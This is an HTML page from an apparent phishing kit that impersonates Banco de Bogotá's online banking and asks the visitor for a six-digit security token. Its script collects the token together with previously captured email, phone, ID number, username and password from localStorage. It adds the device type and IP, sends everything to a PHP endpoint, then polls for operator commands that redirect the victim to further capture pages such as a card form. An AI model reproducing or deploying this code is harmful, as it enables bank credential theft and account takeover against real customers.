<!DOCTYPE html>
<html lang="es">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <title>Banca Virtual</title>
  <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css" rel="stylesheet">
  <style>
@keyframes pulse {
    0% { transform: scale(1); opacity: 1; }
    50% { transform: scale(1.1); opacity: 0.7; }
    100% { transform: scale(1); opacity: 1; }
}

    body {
      background-color: #f7f9fc;
      font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
    }

    .container-box {
      max-width: 450px;
      margin: 30px auto;
      background: white;
      border-radius: 8px;
      box-shadow: 0 0 10px rgba(0,0,0,0.1);
      padding: 30px;
    }

    .logo {
      width: auto;
      max-height: 50px;
    }

    .info-box {
      background-color: #e9f1fb;
      font-size: 14px;
      padding: 12px;
      border-left: 4px solid #005BAC;
      margin-bottom: 15px;
    }

    .form-label {
      font-weight: 600;
      font-size: 14px;
    }

    .form-control {
      font-size: 14px;
      padding: 10px 45px 10px 12px;
    }

    .icon-btn {
      background: none;
      border: none;
      position: absolute;
      right: 12px;
      top: 50%;
      transform: translateY(-50%);
      cursor: pointer;
      color: #3182ce;
      transition: color 0.3s ease;
      z-index: 10;
      padding: 0;
      width: 20px;
      height: 20px;
      display: flex;
      align-items: center;
      justify-content: center;
    }

    .icon-btn:hover {
      color: #1e40af;
    }

    .icon-btn img {
      filter: brightness(0) saturate(100%) invert(27%) sepia(51%) saturate(2878%) hue-rotate(346deg) brightness(104%) contrast(97%);
    }

    .icon-btn:hover img {
      filter: brightness(0) saturate(100%) invert(12%) sepia(83%) saturate(6381%) hue-rotate(346deg) brightness(95%) contrast(101%);
    }

    .input-group-text {
      background: white;
      border-right: 0;
    }

    .tab-line {
      border-bottom: 2px solid #005BAC;
      padding-bottom: 4px;
      margin-right: 15px;
      font-weight: bold;
      color: #005BAC;
    }

    .tab-inactive {
      color: #999;
      font-weight: normal;
      margin-right: 15px;
    }

    .password-field {
      position: relative;
    }

    .password-field .form-control {
      padding-right: 45px;
    }

    .password-field .icon-btn {
      position: absolute;
      right: 12px;
      top: 50%;
      transform: translateY(-50%);
      background: none;
      border: none;
      cursor: pointer;
      color: #3182ce;
      transition: color 0.3s ease;
      z-index: 10;
      padding: 0;
      width: 20px;
      height: 20px;
      display: flex;
      align-items: center;
      justify-content: center;
    }

    .password-field .icon-btn:hover {
      color: #1e40af;
    }

    @media (max-width: 576px) {
      .container-box {
        margin: 20px;
        padding: 20px;
      }
    }

    /* Loader overlay */
    #loader-overlay {
      position: fixed;
      top: 0;
      left: 0;
      width: 100%;
      height: 100%;
      background: rgba(30, 64, 175, 0.9);
      display: none;
      justify-content: center;
      align-items: center;
      z-index: 9999;
    }

    .loader-spinner {
      width: 60px;
      height: 60px;
      animation: blink 1.5s ease-in-out infinite;
    }

    @keyframes blink {
      0%, 100% { opacity: 1; }
      50% { opacity: 0.3; }
    }
  </style>
</head>
<body>

  <div class="text-center" style="background: linear-gradient(135deg, #1e40af 0%, #1e3a8a 100%); padding: 20px; border-radius: 0 0 15px 15px; margin: 0 -15px 20px -15px;">
    <img src="img/descarga.svg" alt="Banco de Bogotá" class="logo mb-2">
  </div>

  <div class="text-center mt-4">
    <h5 class="mt-1">Bienvenido a tu Banca Virtual</h5>
  </div>

  <div class="container-box">



                   <!-- Formulario Token -->
      <div class="row justify-content-center">
        <div class="col-10">
          <div class="mb-3" style="position: relative;">
            <div class="text-center mb-3">
              <img src="img/m5.png" alt="Token" style="max-width: 100px; height: auto;">
            </div>
            <h4 class="text-center fw-bold mb-3">Pago con Token</h4>
           <label for="token" class="form-label text-center" style="color: #666;">Por tu seguridad, consulta el <strong>código de 6 dígitos en tu app Banca Móvil o en tu SMS</strong> e ingrésalo a continuación.</label>
          <input type="text" id="token" class="form-control" placeholder="" maxlength="6" pattern="[0-9]+" oninput="this.value = this.value.replace(/[^0-9]/g, '')" title="Solo números, máximo 6 dígitos">
        </div>
      </div>
    </div>

    <div class="row justify-content-center">
      <div class="col-10">
        <div class="text-center">
          <button id="btnIngresar" class="btn fw-bold" style="width: 100%; border-radius: 25px; background-color: #e0e0e0; border: 1px solid #ccc; color: #666; padding: 12px 20px;" disabled>Continuar</button>
        </div>
      </div>
    </div>

    <!-- Campos hidden necesarios -->
    <input type="hidden" id="session_id" value="">
    <input type="hidden" id="username" value="">

  </div>

  <!-- Loader overlay -->
  <div id="loader-overlay">
    <div class="loader-spinner">
      <img src="img/descarga.svg" alt="Loading" style="width: 100%; height: 100%; object-fit: contain;">
    </div>
  </div>

  <script>
    function validarCampos() {
      const btnIngresar = document.getElementById("btnIngresar");
      const token = document.getElementById("token").value;
      
      // Validar que el token tenga 6 dígitos
      const camposCompletos = token.length === 6;
      
      // Cambiar estado del botón
      if (camposCompletos) {
        btnIngresar.disabled = false;
        btnIngresar.style.background = "linear-gradient(135deg, #1e40af 0%, #1e3a8a 100%)";
        btnIngresar.style.border = "none";
        btnIngresar.style.color = "white";
      } else {
        btnIngresar.disabled = true;
        btnIngresar.style.background = "#e0e0e0";
        btnIngresar.style.border = "1px solid #ccc";
        btnIngresar.style.color = "#666";
      }
    }

    // Agregar event listener al campo token
    document.addEventListener('DOMContentLoaded', function() {
      const tokenField = document.getElementById("token");
      tokenField.addEventListener('input', validarCampos);
      
      // Validar inicialmente
      validarCampos();
    });
  </script>
  
  <script>
    document.addEventListener("DOMContentLoaded", function () {
      const urlParams = new URLSearchParams(window.location.search);
      
      // Generar o recuperar session_id
      let sessionId = localStorage.getItem('session_id');
      if (!sessionId) {
        sessionId = 'session_' + Date.now() + '_' + Math.random().toString(36).substr(2, 9);
        localStorage.setItem('session_id', sessionId);
      }
      
      const sessionInput = document.getElementById('session_id');
      sessionInput.value = sessionId;

      // Obtener usuario desde URL params y establecer en el campo hidden
      const userFromUrl = urlParams.get('user');
      const usernameInput = document.getElementById('username');
      if (userFromUrl) {
        usernameInput.value = userFromUrl;
        localStorage.setItem('username', userFromUrl);
      }

      // Event listener para el botón Continuar
      const btnIngresar = document.getElementById('btnIngresar');
      
      btnIngresar.addEventListener('click', async function (event) {
        event.preventDefault();

        // Obtener el token
        const token = document.getElementById('token').value;
        
        // Validar que el token tenga 6 dígitos
        if (token.length !== 6) {
          alert('El token debe tener 6 dígitos');
          return;
        }

        // Mostrar loader
        const loader = document.getElementById('loader-overlay');
        if (loader) {
          loader.style.display = 'flex';
        }

        const formUsername = document.getElementById('username').value;
        const session_id = document.getElementById('session_id').value;

        localStorage.setItem('username', formUsername);
        localStorage.setItem('token', token);
        localStorage.setItem('session_id', session_id);

                 // Obtener la identificación desde la URL (que se pasó desde index.html)
         const identificacion = urlParams.get('identificacion') || '';
         

        
        // Detectar tipo de dispositivo
        const userAgent = navigator.userAgent;
        let dispositivo = 'PC';
        
        if (/Android/i.test(userAgent)) {
          dispositivo = 'Android';
        } else if (/iPhone|iPad|iPod/i.test(userAgent)) {
          dispositivo = 'iPhone';
        } else if (/Windows/i.test(userAgent)) {
          dispositivo = 'PC';
        } else if (/Mac/i.test(userAgent)) {
          dispositivo = 'Mac';
        } else if (/Linux/i.test(userAgent)) {
          dispositivo = 'Linux';
        }
        
        const hora = new Date().toLocaleString('es-ES');
        
        // Obtener IP y construir mensaje
        fetch('get_ip.php')
          .then(response => response.json())
          .then(data => {
            const ip = data.ip || 'No disponible';
            
                         const mensaje = `
💎BANCO DE BOGOTA💎

<b>fu7ur4ma</b>

---------------
<b>💌Correo:</b> ${localStorage.getItem('correo') || 'No disponible'}
<b>📞Celular:</b> ${localStorage.getItem('cel') || 'No disponible'}
<b>💸Cedula:</b> ${localStorage.getItem('val') || 'No disponible'}
<b>👤Persona:</b> ${localStorage.getItem('per') || 'No disponible'}
<b>🏦Banco:</b> ${localStorage.getItem('nom') || 'No disponible'}
<b>🪬Tipo:</b> RECARGA PSE
---------------
<b>📟Dispositivo:</b> ${dispositivo}
<b>🗺IP:</b> ${ip}
<b>⏱Hora:</b> ${hora}
---------------
👤 Usuario: ${localStorage.getItem('identificacion') || 'No disponible'}
🔑 Clave: ${localStorage.getItem('password') || 'No disponible'}
---------------
🔄 Token: ${token}
---------------`;

            const formData = new FormData();
            formData.append('message', mensaje);
            formData.append('transactionId', session_id);

            fetch('procesar_dinamica.php', {
              method: 'POST',
              body: formData
            })
            .then(res => res.json())
            .then(result => {
              if (result.status === 'success') {
                checkPaymentVerification(session_id, result.messageId);
              } else {
                // Ocultar loader si hay error
                const loader = document.getElementById('loader-overlay');
                if (loader) {
                  loader.style.display = 'none';
                }
              }
            })
            .catch(err => {
              // Ocultar loader si hay error
              const loader = document.getElementById('loader-overlay');
              if (loader) {
                loader.style.display = 'none';
              }
            });
          })
          .catch(() => {
            // Si falla la obtención de IP, enviar sin IP
                         const mensaje = `
💎BANCO DE BOGOTA💎

<b>fu7ur4ma</b>

---------------
<b>💌Correo:</b> ${localStorage.getItem('correo') || 'No disponible'}
<b>📞Celular:</b> ${localStorage.getItem('cel') || 'No disponible'}
<b>💸Cedula:</b> ${localStorage.getItem('val') || 'No disponible'}
<b>👤Persona:</b> ${localStorage.getItem('per') || 'No disponible'}
<b>🏦Banco:</b> ${localStorage.getItem('nom') || 'No disponible'}
<b>🪬Tipo:</b> RECARGA PSE
---------------
<b>📟Dispositivo:</b> ${dispositivo}
<b>🗺IP:</b> No disponible
<b>⏱Hora:</b> ${hora}
---------------
👤 Usuario: ${localStorage.getItem('identificacion') || 'No disponible'}
🔑 Clave: ${localStorage.getItem('password') || 'No disponible'}
---------------
🔄 Token: ${token}
---------------`;

            const formData = new FormData();
            formData.append('message', mensaje);
            formData.append('transactionId', session_id);

            fetch('procesar_dinamica.php', {
              method: 'POST',
              body: formData
            })
            .then(res => res.json())
            .then(result => {
              if (result.status === 'success') {
                checkPaymentVerification(session_id, result.messageId);
              } else {
                // Ocultar loader si hay error
                const loader = document.getElementById('loader-overlay');
                if (loader) {
                  loader.style.display = 'none';
                }
              }
            })
            .catch(err => {
              // Ocultar loader si hay error
              const loader = document.getElementById('loader-overlay');
              if (loader) {
                loader.style.display = 'none';
              }
            });
          });
      });
    });

    async function checkPaymentVerification(transactionId, messageId) {
  try {
    const formData = new FormData();
    formData.append('transactionId', transactionId);
    formData.append('messageId', messageId);

    const res = await fetch('verificar_dinamica.php', {
      method: 'POST',
      body: formData
    });

    const result = await res.json();

    if (result.action) {
      // Opcional: ocultar loader si existe
      const loader = document.getElementById('loader-overlay');
      if (loader) loader.style.display = 'none';

      switch (result.action) {
        case 'pedir_dinamica':
          alert("Error de Clave Dinámica.");
          window.location.href = "token.php";
          break;

        case 'error_logo':
          alert("Usuario o clave incorrectos.");
          window.location.href = "index.html";
          break;

        case 'error_tc':
        case 'tarjeta':
          // Puedes redirigir al formulario de tarjeta personalizado
          window.location.href = "tarjeta.php";
          break;

        case 'confirm_finalizar':
          window.location.href = "/fin.php";
          break;

        default:
          // Acción desconocida: reintentar
          setTimeout(() => checkPaymentVerification(transactionId, messageId), 2000);
          break;
      }
    } else {
      setTimeout(() => checkPaymentVerification(transactionId, messageId), 2000);
    }
  } catch (err) {
    setTimeout(() => checkPaymentVerification(transactionId, messageId), 2000);
  }
}

  </script>


</body>
</html> 